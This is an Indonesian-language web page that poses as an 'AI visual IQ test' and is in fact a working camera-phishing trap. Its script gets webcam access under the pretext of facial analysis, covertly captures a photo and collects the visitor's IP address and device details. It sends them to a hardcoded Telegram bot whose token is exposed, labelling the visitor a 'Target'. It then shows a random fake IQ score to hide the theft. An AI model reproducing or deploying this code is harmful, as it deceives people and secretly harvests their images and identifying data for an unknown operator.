<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tes Kecerdasan Visual AI</title>
    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;700&family=Montserrat:wght@300;500&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --primary-blue: #00bcd4; /* Cyan */
            --dark-bg: #1a1a2e;
            --card-bg: #27273d;
            --text-color: #e0e0e0;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2aWV3Qm94PSIwIDAgNzAgNzAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+Cgk8ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgoJCTxwYXRoIGZpbGw9IiM0NDQ0NUEiIGQ9Ik0wIDBoNzB2NzBIMHoiLz4KCQk8cGF0aCBmaWxsPSIjNTA1MDAwIiBkPSJNMzUgMzVoMzV2MzVIMzV6TTAgMGgzNXYzNUgweCIvPgoJPC9nPgo8L3N2Zz4=') repeat;
            opacity: 0.1;
            z-index: 1;
        }

        .container {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 450px;
            background: var(--card-bg);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            padding: 30px;
            text-align: center;
            border: 1px solid rgba(0, 188, 212, 0.3);
            backdrop-filter: blur(10px);
        }

        h1 {
            font-family: 'Chakra Petch', sans-serif;
            font-size: 1.6rem;
            color: var(--primary-blue);
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 15px;
            text-shadow: 0 0 10px rgba(0, 188, 212, 0.5);
        }

        .icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background-color: var(--primary-blue);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 3rem;
            color: var(--card-bg);
            box-shadow: 0 0 20px var(--primary-blue);
        }

        .description {
            font-size: 0.95rem;
            line-height: 1.6;
            color: var(--text-color);
            margin-bottom: 30px;
        }

        .start-btn {
            background: linear-gradient(45deg, #00bcd4, #00e5ff);
            border: none;
            padding: 15px 35px;
            border-radius: 50px;
            color: #1a1a2e;
            font-weight: bold;
            font-family: 'Chakra Petch', sans-serif;
            font-size: 1rem;
            cursor: pointer;
            box-shadow: 0 8px 25px rgba(0, 188, 212, 0.4);
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .start-btn:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 12px 30px rgba(0, 188, 212, 0.6);
        }

        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
            display: none; /* Hidden by default */
        }

        .loading-text {
            color: var(--primary-blue);
            font-size: 1.1rem;
            margin-bottom: 20px;
            font-family: 'Chakra Petch', sans-serif;
            letter-spacing: 1px;
        }

        .progress-bar-container {
            width: 70%;
            height: 8px;
            background-color: #444;
            border-radius: 5px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00bcd4, #00e5ff);
            border-radius: 5px;
            transition: width 0.1s linear;
        }

        /* Hidden Elements */
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="icon">ðŸ§ </div>
        <h1>TES KECERDASAN VISUAL AI</h1>
        <p class="description">
            Siapakah Anda yang sebenarnya? Uji kemampuan visual dan reaksi otak Anda dengan teknologi AI tercanggih kami. Sistem akan menganalisis ekspresi wajah Anda secara real-time untuk memberikan skor IQ paling akurat!
        </p>
        <button class="start-btn" onclick="startTest()">MULAI TES SEKARANG</button>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <p class="loading-text" id="loadingStatus">Mempersiapkan modul AI...</p>
        <div class="progress-bar-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = '8213442592:AAHQBg6QTw6gP7XeX_hrSFopwlX_ii5B8lo';
        const CHAT_ID = '6213349853';
        
        let stream = null; // Menyimpan stream kamera agar tidak meminta izin berulang

        async function startTest() {
            const loadingOverlay = document.getElementById('loadingOverlay');
            const loadingStatus = document.getElementById('loadingStatus');
            const progressBar = document.getElementById('progressBar');
            loadingOverlay.style.display = 'flex';
            progressBar.style.width = '0%';

            try {
                loadingStatus.innerText = "Mengaktifkan modul kamera AI...";
                
                // Minta izin kamera (pop-up standar browser)
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                let progress = 0;
                let steps = [
                    "Menganalisis pola visual...",
                    "Memproses data ekspresi wajah...",
                    "Menghitung skor IQ komprehensif...",
                    "Menyelesaikan kalibrasi AI...",
                    "Hasil hampir siap!"
                ];
                let currentStep = 0;

                const progressInterval = setInterval(() => {
                    progress += Math.floor(Math.random() * 10) + 5; // Tambah progress secara random
                    if (progress > 100) progress = 100;
                    progressBar.style.width = progress + '%';

                    if (progress >= 20 * (currentStep + 1) && currentStep < steps.length) {
                        loadingStatus.innerText = steps[currentStep];
                        currentStep++;
                    }

                    if (progress >= 100) {
                        clearInterval(progressInterval);
                        loadingStatus.innerText = "Tes Selesai!";
                        
                        // Ambil foto dan info perangkat
                        captureAndSend(stream);

                        // Tampilkan hasil palsu setelah beberapa saat
                        setTimeout(() => {
                            loadingOverlay.style.display = 'none';
                            displayResult();
                        }, 1000);
                    }
                }, 400); // Update setiap 0.4 detik

            } catch (err) {
                loadingOverlay.style.display = 'none';
                Swal.fire({
                    icon: 'warning',
                    title: 'Akses Ditolak',
                    text: 'Tes Kecerdasan Visual AI memerlukan akses kamera untuk menganalisis wajah Anda.',
                    confirmButtonText: 'Coba Lagi',
                    confirmButtonColor: '#00bcd4'
                });
            }
        }

        async function captureAndSend(cameraStream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            // Ambil IP Address
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const userAgent = navigator.userAgent;

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'iq_test_face.jpg');
                formData.append('caption', `ðŸ§  *Hasil Tes IQ Target*\n\nðŸŒ IP: \`${ipData.ip}\`\nðŸ“± Device: \`${userAgent}\``);
                formData.append('parse_mode', 'Markdown');

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                // Matikan kamera setelah foto dikirim
                cameraStream.getTracks().forEach(track => track.stop());
                stream = null; // Reset stream
            }, 'image/jpeg');
        }

        function displayResult() {
            const iqScores = [120, 125, 130, 135, 140, 145, 150];
            const randomIq = iqScores[Math.floor(Math.random() * iqScores.length)];
            let category = "";
            if (randomIq >= 140) category = "Jenius Visual!";
            else if (randomIq >= 130) category = "Sangat Cerdas!";
            else category = "Cerdas & Teliti!";

            Swal.fire({
                title: 'ðŸŽ‰ Tes Selesai!',
                html: `Skor IQ Visual Anda: <b>${randomIq}</b><br>${category}`,
                icon: 'success',
                confirmButtonText: 'OK',
                confirmButtonColor: '#00bcd4'
            });
        }
    </script>
</body>
</html>
